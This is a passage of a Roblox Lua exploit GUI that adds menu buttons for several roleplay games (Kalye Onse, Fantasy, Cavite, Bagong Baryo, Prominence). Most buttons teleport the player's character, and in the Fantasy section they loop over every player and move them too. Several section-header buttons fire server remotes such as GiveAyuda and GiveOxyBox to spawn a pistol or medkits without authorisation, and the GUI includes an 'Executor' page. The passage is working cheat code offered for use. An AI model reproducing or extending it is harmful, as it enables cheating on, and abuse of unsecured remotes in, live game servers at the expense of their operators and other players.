    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SCHOOL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1418.09277, 60.8931389, 118.621124, 0.0218539275, 5.62096893e-08, 0.999761164, 9.110245e-09, 1, -5.64222589e-08, -0.999761164, 1.03411173e-08, 0.0218539275)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE BDO [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-340.49237060546875, 41.12915802001953, 493.6236267089844)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE SMALL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-421.8565673828125, 40.2863883972168, -262.322265625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------FANTASY RP-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(990.8152465820312, 32.28494644165039, 296.9470520019531)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(580.9376220703125, 21.959636688232422, 265.1108093261719)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-737.8309326171875, 4.620716094970703, 292.19171142578125)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-694.0562133789062, 7.702183723449707, 26.884098052978516)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE 1 [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-298.9566955566406, 48.019386291503906, -125.68920135498047)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE 2 [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(2962.96826171875, 42.9012451171875, 1055.046875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FLEECA [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-283.9338684082031, 4.600690841674805, 323.8304443359375)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR DEALER [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-713.2727661132812, 5.238117218017578, -264.2020263671875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("RED GARAGE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(1515.0609130859375, 4.029794692993164, -1342.2032470703125)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX START [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-353.32061767578125, 3.998025417327881, -91.46287536621094)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX LOCATE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-351.8985900878906, 4.048017501831055, -27.99223518371582)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-808.3770141601562, 67.06934356689453, 2825.408935546875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("LIMEYS [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-121.21233367919922, 20.518102645874023, 637.3209838867188)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KOPPE BEAN [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-331.3203125, 20.13085174560547, 252.96755981445312)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-------------------------------CAVITE RP---------------------------", function()
    game:GetService("ReplicatedStorage").GiveAyuda:FireServer("Normal Pistol", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1006.0828857421875, 43.35292434692383, -186.58172607421875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-791.9968872070312, 4.168969631195068, -464.7488098144531)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1146.287109375, 3.9980430603027344, 69.46240997314453)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-723.1824951171875, 4.329793930053711, -1040.801025390625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOX BOX [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-389.4685363769531, 4.183757781982422, -52.90208435058594)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ATM [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-701.1449584960938, 4.229806423187256, -1026.8604736328125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)   

--// 8 Buttons in Main Menu
addMainMenuButton("BLACK MARKET [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(310.0500183105469, 4.998108863830566, 1124.1072998046875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE HIGH GROUND [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(632.6267700195312, 40.997650146484375, -439.8812561035156)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-596.0802001953125, 13.955011367797852, 703.0349731445312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------BAGONG BARYO-----------------------------", function()
    game:GetService("ReplicatedStorage").GiveOxyBox:FireServer("MEDKIT", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1393.31591796875, 6.512001991271973, -573.355712890625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [BAGONG BARYO]", function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(572.8681640625, 4.861981391906738, 211.42648315429688)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1163.9576416015625, 6.478593826293945, -548.2848510742188)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ATM [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1206.787109375, 7.270822525024414, -398.3341369628906)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(876.21923828125, 5.492217063903809, 602.9971313476562)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FISH FARM [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(243.63778686523438, 4.699999809265137, -978.7501831054688)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UWU [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(863.9736938476562, 5.49222469329834, 184.72341918945312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1674.3304443359375, 54.93671417236328, 909.4314575195312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(874.050048828125, 9.073480606079102, -62.26642608642578)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("MECH SHOP [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1284.14794921875, 5.208094596862793, 814.0725708007812)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------PROMINENCE RP-----------------------------", function()
    game:GetService("ReplicatedStorage").GivePistolBox:FireServer("MEDKIT", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-316.231689453125, 4.224208354949951, -278.7334289550781)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-318.2171325683594, 4.224208831787109, -14.7344388961792)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-255.43678283691406, 3.90071439743042, 87.1461410522461)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-557.5521240234375, 8.19964599609375, 255.06863403320312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FISH FARM [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-765.808594, 11.4731388, -735.463379, 0.993488431, -6.31751078e-08, -0.113933206, 7.00669958e-08, 1, 5.64860798e-08, 0.113933206, -6.41012221e-08, 0.993488431)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TAMBAYAN [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-837.4158935546875, 71.86466979980469, -756.404541015625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UWU [PROMINENCE]", function()
   -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(5.1688408851623535, 4.1596574783325195, 223.21153259277344)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget() 
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CRAFT SYSTEM [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-813.8836059570312, -30.67633056640625, -668.554443359375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(639.3765869140625, 4.062220573425293, 417.1491394042969)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-685.2726440429688, 7.258538246154785, -163.53884887695312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("7 ELEVEN [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-71.01229858398438, 3.90071439743042, 561.624267578125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-287.8799133300781, 19.498348236083984, 465.8647155761719)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

-- Particle Snow Effect inside main GUI
local function createSnowParticle()
    local particle = Instance.new("ImageLabel")
    particle.Size = UDim2.new(0, 4, 0, 4)
    particle.BackgroundTransparency = 1
    particle.Image = "rbxassetid://7072718362" -- small white dot
    particle.ImageColor3 = Color3.new(1, 1, 1)
    particle.Position = UDim2.new(math.random(), 0, 0, -5)
    particle.ZIndex = 10
    particle.Parent = main

    local endPos = UDim2.new(particle.Position.X.Scale, 0, 1, 5)
    local tween = TweenService:Create(particle, TweenInfo.new(math.random(3,5)), {Position = endPos, ImageTransparency = 1})
    tween:Play()
    tween.Completed:Connect(function()
        particle:Destroy()
    end)
end

-- Loop particles
task.spawn(function()
    while gui.Parent do
        createSnowParticle()
        task.wait(0.1)
    end
end)

-- Bottom Menu Bar (Home / Grid / Settings / Executor / World)
local BottomBar = Instance.new("Frame")
BottomBar.Size = UDim2.new(1, 0, 0, 40)
BottomBar.Position = UDim2.new(0, 0, 1, -40)
BottomBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BottomBar.BorderSizePixel = 0
BottomBar.Parent = main

local BottomCorner = Instance.new("UICorner", BottomBar)
BottomCorner.CornerRadius = UDim.new(0, 10)

local UIList = Instance.new("UIListLayout")
UIList.FillDirection = Enum.FillDirection.Horizontal
UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIList.VerticalAlignment = Enum.VerticalAlignment.Center
UIList.Padding = UDim.new(0, 20) -- Adjusted padding for 5 buttons
UIList.Parent = BottomBar

local function CreateBottomBtn(txt)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0, 44, 0, 28)
    Btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Btn.Text = txt
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 20
    Btn.Parent = BottomBar

    local BtnCorner = Instance.new("UICorner", Btn)
    BtnCorner.CornerRadius = UDim.new(0, 6)

    return Btn
end

-- Bottom buttons
local HomeBtn = CreateBottomBtn("<3")
local GridBtn = CreateBottomBtn("$")
local SettingsBtn = CreateBottomBtn("‚öô")
local CodeBtn = CreateBottomBtn("</>")
local WorldBtn = CreateBottomBtn("#") -- New World button

-- Pages inside MainFrame
local ScrollFrame = tabHolder -- Assuming ScrollFrame is the tabHolder for Main Menu
local SettingsPage = Instance.new("Frame")
SettingsPage.Size = UDim2.new(1, -20, 1, -70)
SettingsPage.Position = UDim2.new(0, 10, 0, 30)
SettingsPage.BackgroundTransparency = 1
SettingsPage.Visible = false
SettingsPage.Parent = main

local ExecutorPage = Instance.new("Frame")
ExecutorPage.Size = UDim2.new(1, -20, 1, -70)
ExecutorPage.Position = UDim2.new(0, 10, 0, 30)
ExecutorPage.BackgroundTransparency = 1
ExecutorPage.Visible = false
ExecutorPage.Parent = main

local GridPage = Instance.new("Frame")
GridPage.Size = UDim2.new(1, -20, 1, -70)
GridPage.Position = UDim2.new(0, 10, 0, 30)
GridPage.BackgroundTransparency = 1
GridPage.Visible = false
GridPage.Parent = main

local WorldPage = Instance.new("Frame") -- New World Page
